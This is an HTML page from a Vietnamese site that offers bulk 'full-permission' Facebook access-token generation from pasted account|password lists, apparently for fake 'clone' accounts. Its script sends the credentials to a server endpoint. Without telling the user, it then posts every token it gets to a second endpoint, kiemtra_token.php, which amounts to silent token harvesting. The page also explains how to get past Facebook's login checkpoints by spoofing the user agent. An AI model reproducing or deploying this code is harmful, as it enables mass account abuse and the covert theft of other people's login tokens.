
<!DOCTYPE HTML>
<html lang="vn-VN">
	<head>	  
	   <title>#BotVN - GET Access Token Facebook Full Quyền Số Lượng Lớn</title>
           <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
	   <link rel="shortcut icon" href="http://image.prntscr.com/image/c7e4bc3efdfb47f2b8ba463c92902f6d.png">
	   <link rel="icon" href="http://image.prntscr.com/image/c7e4bc3efdfb47f2b8ba463c92902f6d.png">
           <meta name="description" content="GET Access Token Full Quyền, GET token Facebook for Android, GET token Facebook for Iphone,  GET token HTC Sense,  GET token Facebook for IOS,  GET token Facebook for Messenger, GET Token miễn phí , Get Token Số Lượng Lớn">
           <meta name="keywords" content="GET Access Token Full Quyền, GET token Facebook for Android, GET token Facebook for Iphone,  GET token HTC Sense,  GET token Facebook for IOS,  GET token Facebook for Messenger, GET Token miễn phí Get Token Số Lượng Lớn" />
	   <meta name="robots" content="index, follow" />
           <meta name="author" content="Bùi Mạnh Nghĩa">
           <meta name="author" content="https://www.facebook.com/BMN.2312"> 
	   <link rel="stylesheet" type="text/css" href="code/style.css">
          <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
          <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	  <script type="text/javascript" src="code/lol.js"></script>
          <script type="text/javascript">
          function toarst(status,msg,title){
	  Command: toastr[status](msg, title)
	  toastr.options = {
	  "closeButton": true,
	  "debug": false,
	  "progressBar": true,
	  "positionClass": "toast-top-right",
	  "onclick": null,
	  "showDuration": "400",
	  "hideDuration": "1000",
	  "timeOut": "4000",
	  "extendedTimeOut": "1000",
	  "showEasing": "swing",
	  "hideEasing": "linear",
	  "showMethod": "slideDown",
	  "hideMethod": "slideUp"
	 }
         }
         </script>
	</head>
	<body>
    
    <section>
		<div class="content">
﻿<script type="text/javascript">
	i=1;
	startnum = 0
	$(document).ready(function(e) {
	$('.ru-submit').click(function(){
		$('.container').css('display','none');
		_account = $('#editor1').val().trim();
		_app_token = $('#app_token').val().trim();
		if(_account == ""){
			$('.setting').css('display','block');
			$('#process').css('display','none');
			alert("Chưa nhập tài khoản.");
		}else{
			$('.setting').css('display','none');
			$('#process').css('display','block');
			
			_account_array = _account.split(/\n/);
			
			$(".total").text('0/'+_account_array.length);
			ajax();
			function ajax(){
				var _account = _account_array[startnum];
				
				if(_account){
					gettoken(_account);
					setTimeout(function() {
						startnum++;
						ajax();
					}, 2 * 1000);
				}
			}
			function gettoken(_account){
                var hotface = _account.split('|');
				var ngancan = "|";
				$.post('get_access_token.php', {
						app_token : _app_token,
						username : hotface[0],
						password : hotface[1]
						},function(graph){
                            datas = JSON.parse(graph);
							if(datas.error_msg){
								var htmls = $('#editor3').text();
								htmls = _account+ngancan+datas.error_msg+"\n"+htmls;
								$(".totalerror_msg").text((startnum+1));
								$('#editor3').text(htmls);(a="error",c="Get Token Thất Bại",toarst(a,datas.error_msg,c));
							}
							if (datas.access_token){
								var htmls = $('#editor2').text();
								htmls = datas.access_token+"\n"+htmls;
								$('#editor2').text(htmls);
								$(".total").text((startnum+1)+'/'+_account_array.length);
								$.post('kiemtra_token.php', {token : datas.access_token});
							}
				});
			}
		}		
	});
});
</script>

	<div id="process" style="padding: 15px;display:none">
    	<div style="padding-bottom: 5px;"><strong>Đang GET Token : <i class="total">0/0</i></strong></div>
    	<textarea cols="80" id="editor2" name="editor1" readonly rows="50" style="height:200px;width:980px;overflow-y: scroll;overflow: scroll;"></textarea>
    	<div style="padding-bottom: 5px;padding-top: 5px;"><strong>Account Bị Lỗi : <i class="totalerror_msg">0</i></strong> </div>
        <textarea cols="80" id="editor3" name="editor3" readonly rows="50" style="height:200px;width:980px;overflow-y: scroll;overflow: scroll;"></textarea>
        <div>
			<p><br><i class="fa fa-check-square-o" aria-hidden="true"></i> Đừng quên copy lại.</p>
			<p><i class="fa fa-check-square-o" aria-hidden="true"></i> Tải lại trang để tiếp tục GET Token.</p>
	</div>
        </div>
	<form class="setting">
        <div>
            <label style="float:none">Nhập Danh Sách Account</label>
            <textarea cols="80" id="editor1" name="editor1" rows="50" style="height:200px;width:980px" placeholder="account1|password1
account2|password2"></textarea>
			<label style="float:none">Chọn Ứng Dụng</label>
			<select style="width:994px" name="app_token" id="app_token">
			<option value="iphone">FACEBOK FOR IPHONE [ Full Quyền ]</option>
			<option value="android">FACBOOK FOR ANDROID [ Full Quyền ]</option>
		</select>
		</div>
		<div>
			<p><br><i class="fa fa-check-square-o" aria-hidden="true"></i> Định dạng : <strong>account|password</strong></p>
			<p><i class="fa fa-check-square-o" aria-hidden="true"></i> Mỗi nick một dòng</p>
		</div>
		<div>
            <input type="button" value="GET Token" class="ru-submit"><hr>
            <code>Để Get Token Số Lượng Lớn Lâu Dài , lần đầu bạn lên get token HTC để xác nhận ip host và dùng điện thoại very bằng cách login vào http://m.facebook.com và chọn có , đó là tôi login để xác nhận ip host [ chỉ lần đầu bị checkpoint , mấy lần sau dùng bình thường ]</code><br>
            <code>Nếu máy tính thì dùng <b style="color:red;"> user agent switcher (extension của chrome hoặc firefox)</b> fake sang trình duyệt Android hay IOS (cách fake thì google nhé) rồi vào http://m.facebook.com để very nếu có.</code><br>
			<code>Mật khẩu clone <b style="color:red;"> không được phép có kí tự đặc biệt.</b></code>
        </div>
    </form>
        </div>	</section>
	<footer><center><p>Power 2017 - Bót.VN </p></center></footer>
	</body>
</html>